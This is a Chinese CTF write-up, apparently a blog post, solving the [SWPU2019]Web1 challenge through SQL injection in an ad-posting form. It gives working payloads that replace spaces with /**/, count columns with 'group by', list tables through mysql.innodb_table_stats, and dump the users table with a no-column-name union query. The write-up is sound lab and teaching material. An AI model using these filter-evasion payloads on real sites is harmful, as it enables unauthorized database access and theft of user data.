---
title: '[SWPU2019]Web1'
date: 2024-10-04 22:19:45
tags: sql注入
categories: 刷题笔记
---

## [SWPU2019]Web1

**mysql.innodb_table_stats表下分别是database_name,table_name,index_name。你用了这个表，相对的也要换成database_name**

打开页面，注册登录发布广告

![image-20240508194235347](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405081942389.png)

这里疑似sql注入，我们传入1‘，再提交

在首界面的广告详情中发现一条报错语句，说明是sql注入

![image-20240508194322318](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405081943358.png)

经过测试发现空格、or、#、--+、and等进行了过滤，我们需要闭合単引号，使用

```
,'3
```

就能闭合单引号了，而空格可以用/**/代替

开始sql注入

**爆列**

由于order被过滤了，我们使用group来爆列数

我们输入

```mysql
1‘/**/group/**/by/**/22,'3
```

回显正常

而输入

```mysql
1‘/**/group/**/by/**/23,'3
```

就会报错

![image-20240508195241605](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405081952638.png)

可知，一共有22列

**查看回显位**

输入

```
1'union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&&'1'='1

1'union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
22
```

发现回显在2号位和3号位上

![image-20240508203419376](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405082034425.png)

**爆表名**

由于information_schema被过滤了，我们使用innodb_index_stats

```
-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22


```

**注意： 这个地方一定要在前面可显示的位置2，3用select查出表名，因为union select查的是当前数据库中的内容，且有22个字段，如果将from/\**/mysql.innodb_table_stats写在数字后面就查不出。**

爆出表名ads，users

![image-20240508203817718](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405082038774.png)

**爆字段**

这时就要无列名注入了

因为没有mysql.innodb_column_stats这个方法，查不了列名

大概原理就是没有列名，那就给它取名，然后按别名正常继续注入

```
//-1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22

```

就能得到flag了

![image-20240508204849777](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405082048808.png)

------

